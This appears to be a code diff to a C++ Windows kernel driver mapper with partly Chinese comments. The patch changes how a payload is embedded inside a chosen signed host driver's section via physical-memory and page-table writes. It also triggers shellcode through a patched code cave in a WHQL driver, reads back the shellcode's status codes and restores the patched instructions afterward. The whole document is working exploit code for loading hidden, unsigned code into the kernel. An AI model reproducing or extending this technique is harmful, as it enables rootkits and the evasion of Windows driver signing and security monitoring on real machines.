+                    ntoskrnlBase, triggerDrvBase, triggerDrvSize,
+                    &site, caveVA, pfnDataBase))
+            {
+                hostDrvBase    = candBase;
+                hostDrvSize    = candSize;
+                hostLdrEntryVA = candLdrVA;
+                actualHostName = cand;
+                chosenHostName = cand;
+                payloadKernVA  = curTargetVA;
+                firstPtePA     = curPtePA;
+                foundPref      = true;
+                LOG_OK("LoadDrvWsk: Successfully selected and embedded payload inside '%ls' (KernVA=0x%016llX, FirstPtePA=0x%016llX)",
+                       actualHostName, payloadKernVA, firstPtePA);
+                break;
+            } else {
+                LOG_WARN("LoadDrvWsk: Candidate host '%ls' does not have a suitable section, trying next host...", cand);
+            }
         }
     }
 
-    // ---- 9.2 分支 2B：宿主目标节区预备（零修改 PE 头，用户态 0 次物理写入）----
-    uint64_t payloadKernVA = 0; // mswsk 在宿主内部的目标内核 VA
-    uint64_t firstPtePA    = 0; // 目标节区首个 PTE 物理地址
-
-    if (foundPref && chosenHostName) {
-        if (InjectPayloadIntoHost(
-                hDev, cr3, prefBase, prefSize, prefLdrVA,
-                chosenHostName, img, payloadKernVA, firstPtePA,
-                ntoskrnlBase, triggerDrvBase, triggerDrvSize,
-                &site, caveVA, pfnDataBase))
-        {
-            hostDrvBase    = prefBase;
-            hostDrvSize    = prefSize;   // SizeOfImage 保持原生宿主大小不变
-            hostLdrEntryVA = prefLdrVA;
-            actualHostName = chosenHostName;
-            LOG_OK("LoadDrvWsk: [Branch 2B] payload target prepared inside '%ls' at KernVA=0x%016llX (FirstPtePA=0x%016llX)",
-                   actualHostName, payloadKernVA, firstPtePA);
-        } else {
-            LOG_ERR("LoadDrvWsk: InjectPayloadIntoHost failed to embed payload into '%ls'", chosenHostName);
-            VirtualUnlock(img.Image.data(), img.Image.size());
-            CloseHandle(hDev);
-            return false;
-        }
-    } else {
-        LOG_ERR("LoadDrvWsk: No optimal host driver found, aborting (old ExAllocatePool fallback removed)");
+    if (!foundPref || !chosenHostName) {
+        LOG_ERR("LoadDrvWsk: No optimal host driver found with sufficient section space, aborting");
         VirtualUnlock(img.Image.data(), img.Image.size());
         CloseHandle(hDev);
         return false;
@@ -1035,6 +1240,10 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     ctx.psLoadedModuleList = psLoadedModList;
     ctx.whqlDrvBase        = hostDrvBase;
     ctx.whqlDrvSize        = hostDrvSize;
+    if (hostLdrEntryVA == 0) {
+        hostLdrEntryVA = triggerLdrEntryVA ? triggerLdrEntryVA : psLoadedModList;
+        LOG_INFO("LoadDrvWsk: hostLdrEntryVA was 0, fell back to 0x%016llX", hostLdrEntryVA);
+    }
     ctx.whqlLdrEntryVA     = hostLdrEntryVA;                     // fakeDriverObj.DriverSection
     ctx.pImg               = &img;
     ctx.userImageVA        = (uint64_t)img.Image.data();         // 核心突破：用户态锁定缓冲区（当前进程 CR3 下原生可读）
@@ -1076,6 +1285,22 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     uint32_t gle = 0;
     bool ioOk = WhqlTrigger(hDev, &gle);
 
+    // 读取 Code Cave 中的 ShellcodeParams 执行结果与状态码 (在抹除清理之前)
+    ShellcodeParams retParams = {};
+    bool hasReadback = ReadKernelVA(hDev, cr3, caveVA, &retParams, sizeof(retParams));
+    if (hasReadback) {
+        LOG_INFO("LoadDrvWsk: Shellcode execution readback: status=0x%08X (raw GLE=%u)", retParams.status, gle);
+        if (retParams.status == 0xC0000771) {
+            LOG_ERR("LoadDrvWsk: Shellcode failed at MmAllocatePagesForMdl (status=0xC0000771: Memory allocation returned NULL)");
+        } else if (retParams.status == 0xC0000772) {
+            LOG_ERR("LoadDrvWsk: Shellcode failed at MmMapIoSpace (status=0xC0000772: MmMapIoSpace rejected RAM physical address)");
+        } else if (retParams.status == 0xC0000777) {
+            LOG_ERR("LoadDrvWsk: Shellcode failed at MmAllocatePagesForMdl or MmMapIoSpace step (status=0x%08X)", retParams.status);
+        } else if (retParams.status != 0 && retParams.status != DRV_BOOT_MAGIC) {
+            LOG_WARN("LoadDrvWsk: DriverEntry reached and returned NTSTATUS=0x%08X", retParams.status);
+        }
+    }
+
     // ---- 13. 恢复 WHQL default 分支原始指令并清理 Code Cave ----
     RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, totalPayloadSize);
 
@@ -1094,7 +1319,11 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
             UnloadWhqlDriver(triggerDrvName);
             return true;
         }
-        LOG_ERR("LoadDrvWsk: Shellcode execution failed or returned error (GLE=%u)", gle);
+        if (hasReadback && retParams.status != 0) {
+            LOG_ERR("LoadDrvWsk: Shellcode execution failed: NTSTATUS=0x%08X (GLE=%u)", retParams.status, gle);
+        } else {
+            LOG_ERR("LoadDrvWsk: Shellcode execution failed or returned error (GLE=%u)", gle);
+        }
         CloseHandle(hDev);
         hDev = INVALID_HANDLE_VALUE;
         UnloadWhqlDriver(triggerDrvName);
